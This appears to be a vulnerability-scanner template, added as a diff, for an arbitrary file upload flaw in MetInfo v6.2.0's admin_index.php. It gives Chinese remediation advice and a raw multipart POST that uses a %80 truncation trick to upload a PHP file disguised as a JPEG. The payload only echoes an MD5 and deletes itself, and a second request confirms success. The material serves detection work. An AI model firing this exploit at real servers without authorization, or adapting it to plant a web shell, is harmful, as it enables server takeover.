@@ -1,0 +1,53 @@
+id: Metinfo-v6_2_0_admin_index_php-UploadGetShell
+info:
+  name: metinfo_v6.2.0_admin_index.php_任意文件上传getshell
+  author:
+  - l0ne1y
+  description: |-
+    metinfo_v6.2.0_admin_index.php_任意文件上传getshell
+    MetInfo是一款适合企业建站的开源免费CMS建站系统，MetInfo企业网站管理系统主要用于搭建企业网站，采用PHP+Mysql架构。
+
+    MetInfo V6.2.0版本中admin_index.php页面存在任意文件上传，攻击者可利用此漏洞来获取服务器权限。
+  reference:
+  - http://www.yulegeyu.com/2019/06/18/metinfo6-arbitrary-file-upload-via-iconv-truncate
+  - http://llfam.cn/2019/07/12/metinfo%206.2%20%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0/
+  severity: high
+  remediation: |-
+    官方修复方案：<br />1、升级系统至无漏洞版本，或于官网下载安全补丁
+    https://www.mituo.cn/
+
+    临时修复方案：<br />文件上传：<br />1、服务器端将文件上传目录直接设置为不可执行。<br />2、文件类型检查：建议使用白名单方式（比黑名单更可靠），并结合MIME Type、后缀检查等方式（文件类型做白名单限制）。此外对于图片的处理可以使用压缩函数或resize函数，处理图片的同时破坏其包含的HTML代码。<br />3、使用随机数改写文件名和文件路径，使得用户不能轻易访问自己上传的文件。<br />4、单独设置文件服务器的域名。<br />5、验证文件内容，使用正则匹配恶意代码（过滤恶意代码各种绕过方式，如大小写、BASE64编码）限制上传。<br />6、修复服务器可能存在的解析漏洞。<br />7、严格限制可以修改服务器配置的文件上传如：.htaccess。<br />8、隐藏上传文件路径。<br />9、升级Web Server。<br />10、及时修复Web上传代码。<br />11、不能有本地文件包含漏洞。<br />12、注意0x00截断攻击（PHP更新到最新版本）。
+requests:
+- matchers:
+  - type: dsl
+    dsl:
+    - status_code==200
+  matchers-condition: and
+  raw:
+  - |
+    POST /admin/index.php?m=include&c=uploadify&a=doupfile&savepath=shell.php%80&formname=file&is_rename=0 HTTP/1.1
+    Host: {{Host}}
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:67.0) Gecko/20100101 Firefox/67.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Referer: http://localhost/test/upload.html
+    Content-Type: multipart/form-data; boundary=---------------------------12907703219698305354083698
+    Content-Length: 228
+    Connection: close
+    Upgrade-Insecure-Requests: 1
+
+    -----------------------------12907703219698305354083698
+    Content-Disposition: form-data; name="file"; filename="a.jpg"
+    Content-Type: image/jpeg
+
+    <?php echo md5(1);unlink(__FILE__);?>
+
+    -----------------------------12907703219698305354083698--
+- matchers:
+  - type: dsl
+    dsl:
+    - status_code==200 && contains(body,"c4ca4238a0b923820dcc509a6f75849b")
+  path:
+  - '{{BaseURL}}/admin/index.php?m=include&c=uploadify&a=doupfile&savepath={{unix_time()}}.php%80&formname=file&is_rename=0'
+  method: GET
